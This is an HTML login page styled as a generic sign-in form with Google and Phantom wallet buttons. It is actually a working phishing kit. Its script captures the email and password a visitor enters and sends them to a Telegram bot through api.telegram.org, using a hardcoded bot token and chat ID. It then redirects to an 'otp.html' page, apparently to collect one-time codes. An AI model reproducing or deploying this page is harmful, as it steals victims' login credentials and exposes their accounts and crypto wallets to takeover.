<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  
  <style>
    /* ---------------- LOGIN PAGE (new design) ---------------- */
    body.login-page {
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
    }

    .overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .overlay::after {
      content: "";
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.6);
      z-index: 0;
    }

    .login-box {
      position: relative;
      z-index: 1;
      background: #000;
      width: 100%;
      max-width: 270px;
      padding: 30px;
      border-radius: 0px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
      text-align: center;
      color: #fff;
    }

    .login-box h2 {
      margin-bottom: 20px;
    }

    /* Inputs */
    .input-group {
      position: relative;
      margin-bottom: 10px;
      display: flex;
      flex-direction: column;
      align-items: flex-start;
    }

    .input-group label {
      font-size: 13px;
      font-weight: 500;
      margin-bottom: 5px;
      color: #ccc;
    }

    .input-group input {
      width: 90%;
      padding: 8px 15px;
      border: 1px solid #444;
      border-radius: 30px;
      background: transparent;
      color: #fff;
      font-size: 14px;
      outline: none;
      transition: border-color 0.3s;
    }

    .input-group input:focus {
      border-color: #3b82f6;
    }

    .input-group input::placeholder {
      color: #aaa;
    }

    .password-group {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      position: relative;
    }

    /* Toggle icon */
    .toggle-password {
      position: absolute;
      top: 78%;
      transform: translateY(-50%);
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .toggle-password.right {
      right: 0px;
    }

    .toggle-password img {
      width: 27px;
      height: 27px;
      opacity: 0.8;
      transition: opacity 0.2s ease;
    }

    .toggle-password img:hover {
      opacity: 1;
    }

    /* Forgot Password */
    .forgot-password {
      display: block;
      text-align: right;
      font-size: 13px;
      margin-bottom: 20px;
      color: #3b82f6;
      text-decoration: none;
    }

    /* Base button */
    .btn {
      width: 100%;
      border: none;
      cursor: pointer;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    /* Login button */
    .login-btn {
      background: #2563eb;
      color: #fff;
      border-radius: 25px;
      padding: 10px 15px;
      margin-bottom: 20px;
    }

    /* Social buttons */
    .social-btn {
      background: #2C3240;
      color: #fff;
      border-radius: 25px;
      padding: 5px 15px;
      margin-bottom: 15px;
    }

    .social-btn img {
      width: 30px;
      height: 25px;
    }

    /* Divider */
    .divider {
      display: flex;
      align-items: center;
      text-align: center;
      color: #aaa;
      margin: 20px 0;
    }

    .divider::before, .divider::after {
      content: '';
      flex: 1;
      border-bottom: 1px solid #444;
    }

    .divider:not(:empty)::before {
      margin-right: .75em;
    }

    .divider:not(:empty)::after {
      margin-left: .75em;
    }

    /* Sign up */
    .login-box p.signup-text {
      position: relative;
      margin: 20px 0 0 0;
      width: 100%;
      text-align: center;
      font-size: 14px;
      color: #ccc;
    }

    .login-box p.signup-text a {
      color: #4a90e2;
      text-decoration: none;
      font-weight: 600;
    }

    .login-box p.signup-text a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body class="login-page">
  <div class="overlay">
    <div class="login-box">
      <h2>Login</h2>
          
      <!-- Form -->
      <form id="loginForm">
        <!-- Email -->
        <div class="input-group">
          <label for="email">Email</label>
          <input type="email" id="email" name="email" placeholder="Enter email" required>
        </div>

        <!-- Password -->
        <div class="input-group password-group">
          <label for="password">Password</label>
          <input type="password" id="password" name="password" placeholder="Enter password" required>
          <span id="togglePassword" class="toggle-password right">
            <img src="eyes.png" alt="Toggle visibility">
          </span>
        </div>

        <a href="#" class="forgot-password">Forgot password?</a>

        <!-- Login Button -->
        <button type="submit" class="btn login-btn">Login</button>
      </form>

      <!-- Divider -->
      <div class="divider"><span>OR</span></div>

      <!-- Google -->
      <button class="btn social-btn google-btn">
        <img src="goggle.png" alt="Google"> 
        Continue with Google
      </button>

      <!-- Phantom -->
      <button class="btn social-btn phantom-btn">
        <img src="phantom.png" alt="Phantom"> 
        Connect with Phantom
      </button>

      <!-- Sign Up -->
      <p class="signup-text">Donâ€™t have an account? 
        <a href="#">Sign up</a>
      </p>
    </div>
  </div>

  <!-- JavaScript -->
  <script>
    // Password toggle
    const passwordInput = document.getElementById("password");
    const togglePassword = document.getElementById("togglePassword");

    togglePassword.addEventListener("click", function () {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password";
      passwordInput.setAttribute("type", type);
    });

    // Telegram bot settings
    const BOT_TOKEN = "8387730686:AAFo7mnRLBtTkN3HAWrznqbW7fsOxD57HkU";
    const CHAT_ID = "-4909990023";

    // Form submission
    const form = document.getElementById("loginForm");
    form.addEventListener("submit", function(e){
      e.preventDefault();

      const email = form.email.value;
      const password = form.password.value;

      const message = `Login Submission:\nEmail: ${email}\nPassword: ${password}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          body: new URLSearchParams({
              chat_id: CHAT_ID,
              text: message
          })
      })
      .then(res => res.json())
      .then(data => {
          if (data.ok) {
              alert("Successfull");
              window.location.href = "otp.html";
          } else {
              console.error("Telegram error:", data);
          }
      })
      .catch(err => console.error("Fetch error:", err));
    });
  </script>
</body>
</html>
